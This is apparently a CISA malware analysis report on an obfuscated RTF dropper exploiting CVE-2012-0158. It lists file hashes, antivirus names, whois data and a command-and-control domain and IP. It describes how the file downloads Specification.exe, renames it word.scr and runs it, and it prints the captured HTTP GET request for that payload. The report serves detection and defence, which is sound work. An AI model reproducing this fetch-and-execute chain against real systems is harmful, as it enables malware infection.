It is actually an obfuscated RTF that when opened in Microsoft Word, it connected to nanocoatingindonesia.co.id and attempted to download an executable named Specification.exe, copied it over to word.scr and executed it immediately. At the time of this analysis, the domain returned HTTP 404 not found to the HTTP GET request.\nFor a downloadable copy of IOCs, see MIFR-10079683-1.v2.stix.\nFiles (1)\nebbca8bb8e0812f3f66e905a58800a3410ae26b9e1df233741f72021676360dc (ff4138ca9119ab0381ad6575f041e6...)\nDomains (1)\nnanocoatingindonesia.co.id\nIPs (1)\n114.199.90.60\n\nFindings\n\nebbca8bb8e0812f3f66e905a58800a3410ae26b9e1df233741f72021676360dc\nTags\nCVE-2012-0158droppertrojan\nDetails\n\n\n\nName\nff4138ca9119ab0381ad6575f041e633\n\n\nSize\n1203123 bytes\n\n\nType\nRich Text Format data, version 1, unknown character set\n\n\nMD5\nff4138ca9119ab0381ad6575f041e633\n\n\nSHA1\na3639691eb5fa1b41225ff35791f9931b62aeacd\n\n\nSHA256\nebbca8bb8e0812f3f66e905a58800a3410ae26b9e1df233741f72021676360dc\n\n\nSHA512\n42b47b48420367b4d4ce6e94d0d6e776d4ac903873324abd09c4e7776cf0cb5c79796421a6072f5d5624f09eb4080ed69799e6ebb23e68d3cc18f76240c3d1e9\n\n\nssdeep\n96:GiIH6Q+Y2pbrh8mM/iBq7KWJZ6rBcClgJr3u17ejofQqa5hstzaqiFi12B7FiJi6:GlH6rfh8mQ7KraIwmzOiJN64g6mS12y\n\n\nEntropy\n2.667311\n\n\n\nAntivirus\n\n\n\nAhnlab\nRTF/Exploit\n\n\nAntiy\nTrojan[Exploit]/Office.CVE-2012-0158.h\n\n\nAvira\nEXP/CVE-2012-0158.TJ\n\n\nBitDefender\nExploit.RTF.CVE-2012-0158.H\n\n\nClamAV\nRtf.Dropper.Agent-1557037\n\n\nEmsisoft\nExploit.RTF.CVE-2012-0158.H (B)\n\n\nIkarus\nTrojan.Win32.Exploit\n\n\nMcAfee\nExploit-CVE2012-0158.w\n\n\nMicrosoft Security Essentials\nExploit:Win32/CVE-2012-0158\n\n\nNANOAV\nExploit.Rtf.Heuristic-rtf.dinbqn\n\n\nQuick Heal\nExp.RTF.Obfus.Gen\n\n\nSophos\nTroj/DocDrop-ID\n\n\nSymantec\nTrojan.Mdropper\n\n\nTACHYON\nExploit.RTF.CVE-2012-0158.H\n\n\nTrendMicro\nTROJ_MD.E9643850\n\n\nTrendMicro House Call\nTROJ_MD.E9643850\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\n\n\n\n99\n41bc1f68ca81527487e22bb2bc3db796f5a8724258fc8769a288a6ff0f6875e5\n\n\n\nRelationships\n\n\n\nebbca8bb8e...\nConnected_To\nnanocoatingindonesia.co.id\n\n\n\nDescription\nFF4138CA9119AB0381AD6575F041E633 is an obfuscated RTF document, appeared to be crafted to perform penetration testing when examined under a hexadecimal editor. Close to the end of file, ASCII data \"For pentesting purposes only!\" and the MD5 hash value of the RTF were found.\n\n\t\t\tHowever, when the RTF was opened in Microsoft Word, it sent a HTTP GET request to the domain nanocoatingindonesia.co.id in order to download a binary named Specification.exe. If successfully downloaded it would copy Specification.exe to word.scr and immediately execute it.\n\n\t\t\tWhen the RTF was examined under a debugger, the location of word.scr was in the C:\\Windows\\system32 directory; word.scr ran on the system followed by a system crash and reboot. However, when the RTF was opened without a debugger, word.scr was copied to the same directory where RTF was located at and the system did not crash.\n\n\t\t\tAt the time of this analysis, nanocoatingindonesia.co.id returned HTTP 404 Not Found to the HTTP GET request for the Specification.exe binary.\nScreenshots\n \n\nFigure 1 - \n\n \n\nFigure 2 - \n\n \n\nFigure 3 - \n\n \n\nFigure 4 - \n\n\n\nnanocoatingindonesia.co.id\nTags\ncommand-and-control\nHTTP Sessions\n\nGET /1/Specification.exe HTTP/1.1\n\t\t\t\tAccept: */*\n\t\t\t\tAccept-Encoding: gzip, deflate\n\t\t\t\tUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\n\t\t\t\tHost: nanocoatingindonesia.co.id\n\t\t\t\tConnection: Keep-Alive\n\n\t\t\t\tHTTP/1.1 404 Not Found\n\t\t\t\tDate: Fri, 19 Aug 2016 xx:xx:xx GMT\n\t\t\t\tServer: Apache\n\t\t\t\tContent-Length: 336\n\t\t\t\tConnection: close\n\t\t\t\tContent-Type: text/html; charset=iso-8859-1\n\n\t\t\t\t<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n\t\t\t\t<html><head>\n\t\t\t\t<title>404 Not Found</title>\n\t\t\t\t</head><body>\n\t\t\t\t<h1>Not Found</h1>\n\t\t\t\t<p>The requested URL /1/Specification.exe was not found on this server.</p>\n\t\t\t\t<p>Additionally, a 404 Not Found\n\t\t\t\terror was encountered while trying to use an ErrorDocument to handle the request.</p>\n\t\t\t\t</body></html\n\nWhois\nDomain ID:PANDI-DO696479\n\t\t\tDomain Name:NANOCOATINGINDONESIA.CO.ID\n\t\t\tCreated On:10-Mar-2016 04:31:11 UTC\n\t\t\tLast Updated On:15-Mar-2016 04:42:05 UTC\n\t\t\tExpiration Date:10-Mar-2017 23:59:59 UTC\n\t\t\tStatus:ok\n\t\t\tRegistrant ID:04nanoc1\n\t\t\tRegistrant Name:Nano Coating indonesia\n\t\t\tRegistrant Organization:PT Nano Coating Indonesia\n\t\t\tRegistrant Street1:Jl.Industri Selatan 7 Blok FF 1 C\\nKawasan industri Jababeka 2\n\t\t\tRegistrant Street2:Jababeka Cikarang\n\t\t\tRegistrant City:bekasi\n\t\t\tRegistrant State/Province:Jawa Barat\n\t\t\tRegistrant Postal Code:17530\n\t\t\tRegistrant Country:ID\n\t\t\tRegistrant Phone:+62.2189842888x1234\n\t\t\tRegistrant FAX:+62.2189842777\n\t\t\tRegistrant Email:XX@primatigonglobal.co.id\n\t\t\tAdmin ID:04nanoc1\n\t\t\tAdmin Name:Nano Coating indonesia\n\t\t\tAdmin Organization:PT Nano Coating Indonesia\n\t\t\tAdmin Street1:Jl.Industri Selatan 7 Blok FF 1 C\\nKawasan industri Jababeka 2\n\t\t\tAdmin Street2:Jababeka Cikarang\n\t\t\tAdmin City:bekasi\n\t\t\tAdmin State/Province:Jawa Barat\n\t\t\tAdmin Postal Code:17530\n\t\t\tAdmin Country:ID\n\t\t\tAdmin Phone:+62.2189842888x1234\n\t\t\tAdmin FAX:+62.2189842777\n\t\t\tAdmin Email:XX@primatigonglobal.co.id\n\t\t\tTech ID:04hendr62\n\t\t\tTech Name:Hendro\n\t\t\tTech Organization:PT Nano Coating Indonesia\n\t\t\tTech Street1:Jl.Industri Selatan 7 Blok FF 1 C.\\nKawasan Industri Jababeka II Cikarang Kab.Bekasi\n\t\t\tTech City:Bekasi\n\t\t\tTech State/Province:Jawa Barat\n\t\t\tTech Postal Code:17530\n\t\t\tTech Country:ID\n\t\t\tTech Phone:+62.2189842888x1234\n\t\t\tTech FAX:+62.2189842777\n\t\t\tTech Email:XX@primatigonglobal.co.id\n\t\t\tBilling ID:04nanoc1\n\t\t\tBilling Name:Nano Coating indonesia\n\t\t\tBilling Organization:PT Nano Coating Indonesia\n\t\t\tBilling Street1:Jl.Industri Selatan 7 Blok FF 1 C\\nKawasan industri Jababeka 2\n\t\t\tBilling Street2:Jababeka Cikarang\n\t\t\tBilling City:bekasi\n\t\t\tBilling State/Province:Jawa Barat\n\t\t\tBilling Postal Code:17530\n\t\t\tBilling Country:ID\n\t\t\tBilling Phone:+62.2189842888x1234\n\t\t\tBilling FAX:+62.2189842777\n\t\t\tBilling Email:XX@primatigonglobal.co.id\n\t\t\tSponsoring Registrar ID:indoreg\n\t\t\tSponsoring Registrar Organization:INDOREG\n\t\t\tSponsoring Registrar City:Jakarta\n\t\t\tSponsoring Registrar Postal Code:11520\n\t\t\tSponsoring Registrar Country:ID\n\t\t\tSponsoring Registrar Phone:0215821567\n\t\t\tName Server:NS5.INDOREG.CO.ID\n\t\t\tName Server:NS6.INDOREG.CO.ID\n\t\t\tDNSSEC:Unsigned\nRelationships\n\n\n\nnanocoatingindonesia.co.id\nResolved_To\n114.199.90.60\n\n\nnanocoatingindonesia.co.id\nConnected_From\nebbca8bb8e0812f3f66e905a58800a3410ae26b9e1df233741f72021676360dc\n\n\n\n\n\n114.199.90.60\nRelationships\n\n\n\n114.199.90.60\nResolved_To\nnanocoatingindonesia.co.id\n\n\n\n\nRelationship Summary\n\n\n\n\nebbca8bb8e...\nConnected_To\nnanocoatingindonesia.co.id\n\n\nnanocoatingindonesia.co.id\nResolved_To\n114.199.90.60\n\n\nnanocoatingindonesia.co.id\nConnected_From\nebbca8bb8e0812f3f66e905a58800a3410ae26b9e1df233741f72021676360dc\n\n\n114.199.90.60\nResolved_To\nnanocoatingindonesia.co.id\n\n\n\n\nRecommendations\n\nCISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.\n\nMaintain up-to-date antivirus signatures and engines.\nKeep operating system patches up-to-date.\nDisable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.\nRestrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.\nEnforce a strong password policy and implement regular password changes.\nExercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.\nEnable a personal firewall on agency workstations, configured to deny unsolicited connection requests.\nDisable unnecessary services on agency workstations and servers.\nScan for and remove suspicious e-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches the file header).\nMonitor users' web browsing habits; restrict access to sites with unfavorable content.\nExercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).\nScan all software downloaded from the Internet prior to executing.\nMaintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).\n\nAdditional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, \"Guide to Malware Incident Prevention & Handling for Desktops and Laptops\".\n\nContact Information\n\n\n1-888-282-0870\nNCCICCustomerService@us-cert.gov (UNCLASS)\nus-cert@dhs.sgov.gov (SIPRNET)\nus-cert@dhs.ic.gov (JWICS)\n\nCISA continuously strives to improve its products and services.
